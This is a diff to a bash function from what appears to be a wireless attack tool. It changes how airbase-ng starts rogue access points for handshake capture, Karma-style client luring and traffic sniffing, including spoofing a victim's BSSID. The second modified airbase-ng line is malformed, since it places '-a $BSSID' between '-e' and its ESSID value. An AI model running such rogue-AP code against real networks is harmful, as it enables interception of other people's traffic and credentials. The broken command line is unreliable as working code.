@@ -163,9 +163,9 @@ startairbase()
         if [[ $ATTACK == "Handshake" ]]; then
             airbase-ng -$TYPE $ENCRYPTION -c $CHAN -a $VICTIM_BSSID -e $ESSID -v $MON > $sessionfolder/logs/airbase-ng.log &
         elif [[ $ATTACK == "Karma" ]]; then
-            airbase-ng -c $CHAN -x $PPS -I $BEACON -e $ESSID -P -C 15 -v $MON > $sessionfolder/logs/airbase-ng.log &
+            airbase-ng -c $CHAN -x $PPS -I $BEACON -a $BSSID -e $ESSID -P -C 15 -v $MON > $sessionfolder/logs/airbase-ng.log &
         else # This just gives us an AP for Sniffing
-            airbase-ng -c $CHAN -x $PPS -I $BEACON -e $ESSID -P -v $MON > $sessionfolder/logs/airbase-ng.log &
+            airbase-ng -c $CHAN -x $PPS -I $BEACON -e -a $BSSID $ESSID -P -v $MON > $sessionfolder/logs/airbase-ng.log &
         fi
         sleep 1.5
     fi
@@ -195,7 +195,7 @@ startairbase()
     done
     route -n
     AIRBASE="On"
-    monitor $AP
+    [[ $ATTACK != "Handshake" ]] && monitor $AP
 }
 
 starthostapd()
